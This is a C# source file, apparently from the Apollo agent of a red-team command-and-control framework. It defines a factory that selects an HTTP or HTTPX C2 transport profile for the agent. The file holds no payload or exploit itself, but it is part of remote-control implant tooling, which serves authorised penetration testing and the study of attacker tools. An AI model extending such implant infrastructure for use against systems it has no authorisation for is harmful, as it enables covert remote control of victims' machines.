using ApolloInterop.Interfaces;
#if HTTP
using HttpTransport;
#endif
#if HTTPX
using HttpxTransport;
#endif
using System;
using System.Collections.Generic;

namespace Apollo.Management.C2
{
    public class C2ProfileManager : ApolloInterop.Classes.C2ProfileManager
    {
        public C2ProfileManager(IAgent agent) : base(agent)
        {

        }

        public override IC2Profile NewC2Profile(Type c2, ISerializer serializer, Dictionary<string, string> parameters)
        {
#if HTTP
            if (c2 == typeof(HttpProfile))
            {
                return new HttpProfile(parameters, serializer, Agent);
            }
#endif
#if HTTPX
            if (c2 == typeof(HttpxProfile))
            {
                return new HttpxProfile(parameters, serializer, Agent);
            }
#endif
            throw new ArgumentException($"Unsupported C2 Profile type: {c2.Name}");
        }
    }
}
